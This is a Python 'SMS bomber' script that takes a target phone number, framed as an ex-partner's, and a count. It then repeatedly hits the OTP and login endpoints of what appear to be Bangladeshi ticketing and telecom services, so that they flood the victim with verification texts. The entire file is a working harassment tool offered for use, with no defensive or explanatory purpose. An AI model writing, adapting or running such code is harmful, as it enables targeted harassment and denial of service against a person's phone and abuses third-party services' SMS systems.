import os
import requests
import time

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
line = yellow + "======================================================================================================================"
space = " "
logo = red + str("""
     😑 😑                                                    
""")

# HEADER
text = cyan + "\t\tUse this wisely" + green + "\n\n\t\t Bomb Your -ex    \n"
notice = ""


def header():
    print(logo)
    print(text)
    print(line)
    print(notice)


# SELECT_MAIN
def opt():
    print(cyan + "\n==> Select =1")
    print(yellow + "\n\n [1] Start\n\n [2] Exit (Button not gonna work, you need to close browser tab")


# MAIN_TOOL
try:
    os.system('clear')
except:
    os.system('cls')
tt = 1
header()
opt()
while tt < 2:
    opt2 = str(input(blue + "\n\n [>] Use your ex's number : " + yellow))
    if opt2 == "1":
        text = cyan + "\t\tUse this wisely" + green + "\n\n\t\t -------    \n"
        try:
            os.system('clear')
        except:
            os.system('cls')
        header()
        number = str(input(blue + "\n\n [>] Number without country code : " + yellow))
        ammount = int(input(blue + "\n [>] How many : " + yellow))
        os.system('clear')
        notice = cyan + "\n\t   [•] Message are being transferred\n\n"
        header()
        ammount2 = 1
        totalsent = 0
        totalnotsent = 0
        import requests
        from requests.structures import CaseInsensitiveDict

        url = "https://api.bdtickets.com:20100/v1/user"

        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/json"
        data = "{\"phoneNumber\":\"+88" + number + "\",\"firstName\":\"asijfjyff\",\"givenName\":\"asif\",\"email\":\"nasagkfkfasni@gmail.com\",\"locale\":\"EN\",\"sendOtp\":true,\"debug\":false}"
        resp = requests.post(url, headers=headers, data=data)

        while ammount2 < ammount + 1:
            try:
                if "0111" in number or "019" in number:
                    r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",
                                      data={"mobile": number})

                else:
                    import requests
                    from requests.structures import CaseInsensitiveDict

                    url = "https://api.bdtickets.com:20100/v1/auth"

                    headers = CaseInsensitiveDict()
                    headers["Content-Type"] = "application/json"
                    data = "{\"phoneNumber\":\"+88" + number + "\"}"

                    resp = requests.post(url, headers=headers, data=data)

                if ammount2 == 1:
                    print(cyan + "\n\t  ==>   " + green + "Done")
                elif ammount2 == 2:
                    print(cyan + "\n\t  ==>   " + green + "Done=2")
                elif ammount2 == 3:
                    print(cyan + "\n\t  ==>   " + green + "Done=3")
                else:
                    print(cyan + "\n\t  ==>   " + green + "[✓] " + str(ammount2) + "Sending more")
                time.sleep(1)
                totalsent += 1
                ammount2 += 1
            except:
                if ammount2 == 1:
                    print(cyan + "\n\t  ==>   " + red + " 1st SMS Not Sent.")
                elif ammount2 == 2:
                    print(cyan + "\n\t  ==>   " + red + " 2nd SMS Not Sent.")
                elif ammount2 == 3:
                    print(cyan + "\n\t  ==>   " + red + " 3rd SMS Not Sent.")
                else:
                    print(cyan + "\n\t  ==>   " + red + " " + str(ammount2) + "th SMS Not Sent.")
                    time.sleep(10)
                    ammount2 += 1

        totalhit = ammount2 - 1
        totalnotsent = totalhit - totalsent
        print(cyan + "\n\n\t\t[•] Total Hits : " + yellow + str(totalhit))
        print(green + "\n\t\t[✓] Total Sent : " + yellow + str(totalsent))
        print(red + "\n\t\t[×] Total Not Sent : " + yellow + str(totalnotsent) + "\n")
        lastt = str(input(cyan + "\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
        os.system('clear')
        notice = ""
        text = green + "\n\n\t\t ------  \n"
        header()
        opt()


    elif opt2 == "2":
        os.system("python3 main2.py")
    else:
        text = cyan + "\t\tUse this wisely" + green + "\n\n\t\t  BD SMS Bomber    \n"
        notice = red + "\n\t\t[×] Wrong Value Entered"
        try:
            os.system('clear')
        except:
            os.system('cls')
        header()
        opt()
        continue
